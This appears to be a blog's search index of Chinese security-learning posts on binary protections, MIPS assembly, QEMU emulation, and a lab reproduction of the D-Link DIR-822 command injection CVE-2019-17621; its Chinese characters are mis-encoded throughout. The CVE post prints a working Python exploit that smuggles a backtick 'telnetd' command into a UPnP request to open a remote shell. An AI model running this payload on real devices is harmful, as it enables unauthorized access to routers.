<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ç¨‹åºä¿æŠ¤æœºåˆ¶</title>
    <link href="/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>æ ˆä¸å¯æ‰§è¡Œ no execute</p><p>åŒDEPï¼Œæ•°æ®æ‰§è¡Œä¿æŠ¤ã€‚</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>æ ˆä¸­åŠ ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œè¿”å›ä¹‹å‰ï¼Œæ£€æŸ¥è¿™ä¸ªéšæœºæ•°æ˜¯å¦æ”¹å˜æ¥åˆ¤æ–­æ˜¯å¦æ ˆæº¢å‡º</p><h2 id="PIEä¸ASLR"><a href="#PIEä¸ASLR" class="headerlink" title="PIEä¸ASLR"></a>PIEä¸ASLR</h2><p>ASLRéšæœºå †ã€æ ˆã€mmapçš„åœ°å€</p><p>PIEéšæœºæ•°æ®æ®µã€ä»£ç æ®µçš„åœ°å€</p><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>relocation read-only é‡å®šå‘åªè¯»</p><p>å¼€å¯ä¹‹ågotè¡¨ä¸å¯å†™</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/14/mips%E6%B1%87%E7%BC%96/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BE%8B%E9%A2%98/"/>
    <url>/2023/03/14/mips%E6%B1%87%E7%BC%96/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mipsçš„å †æ ˆ</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h4 id="MIPSçš„æ ˆğŸ’£"><a href="#MIPSçš„æ ˆğŸ’£" class="headerlink" title="MIPSçš„æ ˆğŸ’£"></a>MIPSçš„æ ˆğŸ’£</h4><ol><li><p>æ ˆå¢é•¿æ–¹å‘ï¼šåŒx86ï¼Œå‘ä½åœ°å€å¢é•¿</p></li><li><p>æ²¡æœ‰EBPæŒ‡é’ˆï¼ˆä½†æ˜¯æœ‰ä¸€ä¸ªfpï¼Œè§MIPSæ±‡ç¼–è¿™ç¯‡æ–‡ç« ï¼‰</p></li><li><p>ä¼ å‚ï¼šå‰å››ä¸ªå‚æ•°é€šè¿‡$a0~$a3ä¼ é€’ï¼Œå¤šå‡ºçš„å‚æ•°æ”¾å…¥æ ˆç©ºé—´</p></li><li><p>è¿”å›å€¼ï¼š$RAå¯„å­˜å™¨ </p></li></ol><h4 id="mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«"><a href="#mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«" class="headerlink" title="mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«"></a>mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«</h4><ol><li>å°†$PCå¯„å­˜å™¨ç§»åˆ°$RAå¯„å­˜å™¨</li><li>å¦‚æœè¢«è°ƒç”¨çš„å‡½æ•°æ˜¯å¦‚æœæ˜¯éå¶å‡½æ•°ï¼ˆè°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œå°†$RAå­˜åœ¨æ ˆï¼›å¶å‡½æ•°åˆ™ä¸å˜</li><li>å‡½æ•°è¿”å›æ—¶ï¼Œå¶å‡½æ•°ç›´æ¥ <code>jr $RA</code>ï¼Œéå¶å‡½æ•°å…ˆæŠŠè¿”å›åœ°å€å­˜å…¥$RAå†è·³è½¬</li></ol><p>ã€Šå®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜ã€‹è¿™æœ¬ä¹¦ä¸Šçš„å›¾ä¾‹ï¼š</p><p><img src="/img/mips/1.jpg"></p><h4 id="ä¸»è°ƒå‡½æ•°å¹²çš„äº‹"><a href="#ä¸»è°ƒå‡½æ•°å¹²çš„äº‹" class="headerlink" title="ä¸»è°ƒå‡½æ•°å¹²çš„äº‹"></a>ä¸»è°ƒå‡½æ•°å¹²çš„äº‹</h4><h5 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h5><ol><li><p>åˆ›å»º <code>more argument.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//more argument.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">more_arg</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> e)</span><br>&#123;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">sprintf</span>(dst,<span class="hljs-string">&quot;%d%d%d%d%d\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a1=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> a2=<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> a3=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">int</span> a4=<span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> a5=<span class="hljs-number">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">mips-linux-gnu-gcc ./<span class="hljs-built_in">more</span>\ argument.c  -o   <span class="hljs-built_in">more</span>\ argument<br></code></pre></td></tr></table></figure></li><li><p>idaæ‰“å¼€</p><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°å‰å››ä¸ªå‚æ•°å­˜å…¥äº†$a0~$a3</p><p><img src="/img/mips/2.jpg"></p><p>ç„¶åå‰é¢5ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure><p>æ˜¯èµ‹å€¼æ“ä½œï¼Œå› æ­¤ä¸­é—´çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure><p>å³ä¸ºç¬¬äº”ä¸ªå‚æ•°çš„ä¼ é€’</p></li></ol><h4 id="è¢«è°ƒå‡½æ•°å¹²çš„äº‹"><a href="#è¢«è°ƒå‡½æ•°å¹²çš„äº‹" class="headerlink" title="è¢«è°ƒå‡½æ•°å¹²çš„äº‹"></a>è¢«è°ƒå‡½æ•°å¹²çš„äº‹</h4><p>è¢«è°ƒç”¨å‡½æ•°çš„å¼€å¤´å¹²äº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼ˆä»…é’ˆå¯¹éå¶å‡½æ•°ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼ŒæŠ¬é«˜sp 0x40ä¸ªå­—èŠ‚<em><strong>ï¼ˆè¿™é‡Œ0x40æ˜¯éšä¾¿å†™çš„ï¼‰</strong></em>ã€‚ç„¶åå°†raæ”¾åˆ°<code>sp + 0x38 + 4</code>ï¼Œfpæ”¾åˆ°<code>sp + 0x38 + 0</code>çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¢«è°ƒå‡½æ•°çš„æ ˆåº•ä¸ºraï¼Œç„¶åæ˜¯fpã€‚æœ€åå°†fpèµ‹å€¼ä¸ºspã€‚</p><p>ç„¶åéœ€è¦å¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼Œarg_0 åˆ°arg_Cæ˜¯ä¸»è°ƒå‡½æ•°é¢„ç•™å‡ºæ¥çš„ç©ºé—´ï¼Œéœ€è¦è¢«è°ƒå‡½æ•°å†æŠŠ$a0-$a3å­˜å…¥è¿›å»ï¼Œç„¶åarg_10æœ¬èº«ä¸»è°ƒå‡½æ•°å°±å·²ç»å­˜å¥½äº†ç¬¬äº”ä¸ªå‚æ•°ï¼Œä¸éœ€è¦åŠ¨ã€‚</p><p><img src="/img/mips/3.jpg"></p><p>æœ€ç»ˆä¸»è°ƒå’Œè¢«è°ƒå‡½æ•°çš„æ ˆé•¿è¿™æ ·ï¼š</p><p><img src="/img/mips/4.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>mipsæ±‡ç¼–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mipæ±‡ç¼–</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h2 id="MIPSæ±‡ç¼–"><a href="#MIPSæ±‡ç¼–" class="headerlink" title="MIPSæ±‡ç¼–"></a>MIPSæ±‡ç¼–</h2><ol><li><p>å¯„å­˜å™¨</p><p>32ä¸ªï¼Œ$0 ~ $31ï¼Œæ¯ä¸ªå¯„å­˜å™¨å…·ä½“ä½œç”¨è§ <a href="https://ctf-wiki.org/assembly/mips/readme/">https://ctf-wiki.org/assembly/mips/readme/</a></p><p>å¸¸è§çš„åŒ…æ‹¬ï¼š</p></li></ol><table><thead><tr><th align="center">å¯„å­˜å™¨</th><th align="center">ä½œç”¨</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">æ’å®šä¸º0</td></tr><tr><td align="center">$4 - $7</td><td align="center">å‡½æ•°å‚æ•°ï¼Œé€šå¸¸ä¹Ÿå«$a0 - $a3</td></tr><tr><td align="center">$29</td><td align="center">$spï¼Œæ ˆé¡¶</td></tr><tr><td align="center">$30</td><td align="center">$fpï¼Œæ ˆå¸§</td></tr><tr><td align="center">$31</td><td align="center">$raï¼Œè¿”å›åœ°å€</td></tr></tbody></table><p>é™¤äº†è¿™32ä¸ªå¯„å‡ºå™¨ï¼Œè¿˜æœ‰$PCå’Œ HIã€LO</p><ol start="2"><li><p>æŒ‡ä»¤</p><p>MIPSæŒ‡ä»¤ä¸ºload-storeæ¶æ„ï¼Œæ“ä½œæ•°å¿…é¡»å…ˆä»å†…å­˜ä¸­è¯»å–åˆ°å¯„å­˜å™¨é‡Œæ‰èƒ½è¿ç®—ï¼Œ<strong>ä¸èƒ½ç›´æ¥æ“ä½œå†…å­˜</strong></p><table><thead><tr><th align="center">æŒ‡ä»¤</th><th align="center">å†…å®¹</th></tr></thead><tbody><tr><td align="center">beq</td><td align="center">branch on equal</td></tr><tr><td align="center">bgez</td><td align="center">branch on greater than or euqal to zero ï¼ˆâ‰¥0è·³è½¬ï¼‰</td></tr><tr><td align="center">bgezal</td><td align="center">ï¼ˆal = and linkï¼‰  $raè®¾ç½®ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤ç„¶åè·³è½¬ï¼Œç›¸å½“äºè·³è½¬åˆ°ä¸€ä¸ªå‡½æ•°</td></tr><tr><td align="center">bgtz</td><td align="center">branch on greater than zero ï¼ˆï¼0è·³è½¬ï¼‰</td></tr><tr><td align="center">bne</td><td align="center">branch on not equal</td></tr><tr><td align="center">jal</td><td align="center">jump and link è¿‡ç¨‹è°ƒç”¨ï¼Œä¼šå°†$raè®¾ç½®ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr></tbody></table><p>è¿ç®—ï¼šä¹˜æ³•ä¼šå°†ç»“æœé«˜32ä½å­˜å…¥HIï¼Œä½32ä½å­˜å…¥LO</p><p>â€‹            é™¤æ³•ä¼šå°†ä½™æ•°å­˜å…¥HIï¼Œå•†å­˜å…¥LO</p><p>ä¸‰ä¸ªæ“ä½œæ•°ï¼Œéƒ½æ˜¯å°†å³è¾¹ä¸¤ä¸ªçš„è®¡ç®—å­˜å…¥å·¦è¾¹çš„ï¼Œä¾‹å¦‚ or $d,$s,$t ï¼Œd = s | t</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>mipsæ±‡ç¼–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qemuçš„å®‰è£…ä¸ä»¿çœŸç¬¬ä¸€ä¸ªmipsç¨‹åº</title>
    <link href="/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="QEMUå®‰è£…"><a href="#QEMUå®‰è£…" class="headerlink" title="QEMUå®‰è£…"></a>QEMUå®‰è£…</h4><p>QEMUä»¿çœŸç¨‹åºåˆ†ä¸ºä¸¤ç±»ï¼šä½¿ç”¨è€…æ¨¡å¼ï¼ˆUser Modeï¼‰ã€ç³»ç»Ÿæ¨¡å¼ï¼ˆSystem Modeï¼‰ã€‚åŒºåˆ«åœ¨äºUser Modeåªä»¿çœŸå•ä¸ªç¨‹åºï¼Œè€ŒSystem Modeä»¿çœŸæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œç±»ä¼¼vmware</p><h5 id="ä½¿ç”¨è€…æ¨¡å¼"><a href="#ä½¿ç”¨è€…æ¨¡å¼" class="headerlink" title="ä½¿ç”¨è€…æ¨¡å¼"></a>ä½¿ç”¨è€…æ¨¡å¼</h5><p>å®‰è£…ï¼š<code>sudo apt-get install qemu-user[-static]</code></p><p>ä½¿ç”¨ï¼ˆä»¥mipsä¸ºä¾‹ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure><p>å¯¹äº32ä½å°ç«¯åºï¼ˆLSBï¼‰ç¨‹åºï¼Œä½¿ç”¨<code>qemu-mipsel</code>æ¥ä»¿çœŸï¼Œ32ä½MSBç¨‹åºï¼Œä½¿ç”¨<code>qemu-mips</code>æ¥ä»¿çœŸ</p><p>ä¸€ä¸ªå°ç«¯åºçš„ä»¿çœŸç¤ºä¾‹ï¼š</p><p><img src="/img/qemu/1.jpg"></p><blockquote><p>Q1ï¼šä¸ºä»€ä¹ˆè¦åŠ  -static ï¼Ÿ</p><p>A1ï¼šxxx-staticè¡¨ç¤ºä½¿ç”¨é™æ€é“¾æ¥çš„qemuç¨‹åºï¼Œä¸ä¾èµ–å¤–éƒ¨åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œç”±äºä½¿ç”¨æ˜¯è¦chrootæ”¹å˜æ ¹ç›®å½•ï¼ŒåŸæœ¬çš„åŠ¨æ€é“¾æ¥åº“ä¼šæ— æ³•æ‰¾åˆ°ï¼Œé™¤éä½¿ç”¨lddå‘½ä»¤æŠŠæ‰€æœ‰ä¾èµ–å…¨éƒ½å¤åˆ¶åˆ°æ–°çš„æ ¹ç›®å½•ä¸‹ï¼Œå¦åˆ™æ— æ³•è¿è¡Œã€‚</p><p>è€Œä¸”çœŸçš„å¤åˆ¶åŠ¨æ€é“¾æ¥åº“è¿‡æ¥å¯èƒ½ä¼šå’ŒåŸæœ¬å­˜åœ¨çš„æ–‡ä»¶é‡åï¼ˆæˆ‘çŒœçš„ï¼Œæ²¡éªŒè¯è¿‡ğŸ˜…ï¼‰</p></blockquote><h5 id="ç³»ç»Ÿæ¨¡å¼"><a href="#ç³»ç»Ÿæ¨¡å¼" class="headerlink" title="ç³»ç»Ÿæ¨¡å¼"></a>ç³»ç»Ÿæ¨¡å¼</h5><p>ä¸ç®¡äº†ï¼Œç›´æ¥ç”¨fapï¼ˆ</p><p>è§ä¸Šä¸€ç¯‡æ–‡ç«  <a href="https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/">https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</a></p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-17621 dlink-822 å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°</title>
    <link href="/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/"/>
    <url>/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç¬¬ä¸€æ¬¡æˆåŠŸä»¿çœŸä¸€ä¸ªå›ºä»¶å¹¶æˆåŠŸè®¿é—®webå¹¶æˆåŠŸå¤ç°æ¼æ´çš„exp â€¦â€¦</p><p>æœŸé—´ç”¨ firmware-analysis-toolkit å’Œ firmware-analysis-plus ï¼ˆåŒ…æ‹¬å®ƒçš„dockerï¼‰åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼ˆkali2020.4ï¼Œkali2022.4ï¼‰ä¸Šæ¥å›å®éªŒäº†å„ç§å„æ ·çš„å›ºä»¶ï¼Œæœ€ç»ˆçš„æˆåŠŸç›®å‰çœ‹æ¥åªæ˜¯ä¸€ä¸ªå¶ç„¶ï¼ˆå› ä¸ºé‡åˆ°äº†å¤ªå¤šæˆ‘ç›®å‰æ— æ³•è§£é‡Šçš„é—®é¢˜ï¼‰ç‰¹æ­¤è®°å½•ä¸€ä¸‹ğŸ˜ª</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>kali2020.4 ï¼ˆåŒæ ·çš„å›ºä»¶ï¼ŒåŒæ ·ç‰ˆæœ¬çš„fapï¼Œä½†æ˜¯åœ¨kali2022.4ä¸Šè¿è¡Œè¿™ä¸ªå›ºä»¶æ—¶ï¼Œä¼šInternal Error 500ï¼ˆä½†èµ·ç èƒ½è®¿é—®åˆ°è¿™ä¸ªipâ€¦â€¦ğŸ˜…ï¼‰</p><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p><p>å°±è¿™ä¸€ä¸ªç‰ˆæœ¬1.03B03</p><p><img src="/img/CVE-2019-17621/1.jpg"></p><p>fapä½¿ç”¨çš„æ˜¯2.3ç‰ˆæœ¬ <a href="https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p><p>ä½¿ç”¨çš„expæ¥æº <a href="https://www.jianshu.com/p/409106be87b7">https://www.jianshu.com/p/409106be87b7</a></p><h4 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h4><p><img src="/img/CVE-2019-17621/2.jpg"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="å‘"><a href="#å‘" class="headerlink" title="å‘"></a>å‘</h4><p>è¿™æ˜¯ç¬¬ä¸€æ¬¡ä»¿çœŸå›ºä»¶ï¼Œä¸€å¼€å§‹ç”¨çš„æ˜¯firmware-analysis-toolkitï¼ˆfatï¼Œ<a href="https://github.com/attify/firmware-analysis-toolkit">https://github.com/attify/firmware-analysis-toolkit</a>ï¼‰ï¼Œé¦–å…ˆå®ƒå®‰è£…çš„æ—¶å€™å°±ä¸€å †é—®é¢˜ã€‚åŒ…æ‹¬å®ƒçš„setup.shé‡Œï¼Œè¦å®‰è£…ä¸ªlsb-coreï¼Œä½†æ˜¯aptæ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼Œä¸Šç½‘æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆåŠŸå®‰è£…çš„ï¼Œç„¶ååœ¨ä»–çš„issueé‡Œå‘ç°æœ‰äººè¯´è¿™ä¸ªä¸æ˜¯å¿…è¦çš„ï¼Œå¯ä»¥åˆ æ‰ğŸ˜…ï¼Œç„¶åsetp.shé‡Œè¿˜æœ‰ä¸ªqt5base-devçš„åŒ…ï¼Œåœ¨kaliä¸Šå®é™…åº”è¯¥æ˜¯qtbase5-devğŸ˜…ï¼Œæˆ‘ä¸çŸ¥é“å…¶ä»–ç³»ç»Ÿæ˜¯å•¥æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªå‘æ˜¯å› ä¸ºgit  cloneä¸ç¨³å®šï¼Œæˆ‘æ‰‹åŠ¨ä¸‹è½½çš„zipåŒ…ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªcloneæ˜¯è¦recursiveçš„ğŸ˜…ï¼Œç›´æ¥è¿è¡Œfat.pyä»–æ˜¯ç”¨pexpectå»å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åæ–°å¯åŠ¨çš„è¿™ä¸ªè¿›ç¨‹å¹¶ä¸ä¼šæŠŠè¾“å‡ºæ˜¾ç¤ºè¿‡æ¥ï¼Œçœ‹æºç è°ƒè¯•åŠå¤©æ‰å‘ç°æ˜¯å°‘æ–‡ä»¶ï¼Œå½“æ—¶è¿˜å¾ˆçº³é—·ğŸ˜…ä¸ºå•¥ä¼šå°‘ï¼ˆè¿‡äºncï¼‰</p><p>ç›¸å¯¹æ¥è¯´firmware-analysis-plusï¼ˆfapï¼Œ<a href="https://github.com/liyansong2018/firmware-analysis-plus">https://github.com/liyansong2018/firmware-analysis-plus</a>ï¼‰æ¯”è¾ƒå‹å¥½ï¼ˆå’ŒfatåŸºæœ¬ä¸€æ ·ï¼Œåªä¸è¿‡ç»†èŠ‚ä¸Šåšäº†ä¸€äº›ä¿®æ”¹ï¼‰ï¼Œé¦–å…ˆï¼Œå…¶ä»–é¡¹ç›®çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åœ¨äº†åº“é‡Œï¼ˆæ²¡æœ‰é‚£ä¸ªé€’å½’äº†ğŸ˜…ï¼‰ç„¶åè¿˜åšäº†ä¸€ä¸ªdockerï¼Œä½†æ˜¯è¿™ä¸ªdockeræ²¡æœ‰è£…jeffersonï¼Œä»¿çœŸä¸äº†jffsçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåªèƒ½ç»§ç»­è‡ªå·±é…ç¯å¢ƒğŸ˜…ã€‚fat.pyåé¢è¦åŠ ä¸€ä¸ª-q qemu-pathçš„å‚æ•°ï¼Œå¦åˆ™network  interfaceåˆ—è¡¨ä¼šä¸ºç©ºï¼ˆncå¦‚æˆ‘è¿˜è·‘å»äººå®¶issueåº•ä¸‹é—®ï¼Œè¿˜å¥½äººå®¶æ²¡è¿‡å‡ åˆ†é’Ÿå°±å›å¤äº†ğŸ˜…ï¼‰</p><p>ç„¶åexpéƒ¨åˆ†ä¸€å¼€å§‹æˆ‘ç”¨çš„è¿™ä¸ªå¸–å­çš„exp ï¼š<a href="http://www.manongzj.com/blog/28-tkbcqqitdf.html">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>ï¼Œè·‘ä¸é€šï¼Œåæ¥æ¢æˆäº†å‰æ–‡ç”¨çš„expï¼Œå±…ç„¶å¥½ä½¿äº†ã€‚ã€‚ã€‚æˆ‘æ²¡çœ‹å‡ºæ¥è¿™ä¿©expæœ‰å•¥åŒºåˆ«ï¼Œä¸æƒ³ç®¡äº†ğŸ˜…ï¼Œç¬¬ä¸€æ¬¡å›ºä»¶ä»¿çœŸåˆ°æ­¤ç»“æŸï¼Œæ¼æ´æ˜¯å•¥åŸç†æš‚æ—¶ä¸æƒ³ç®¡äº†</p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
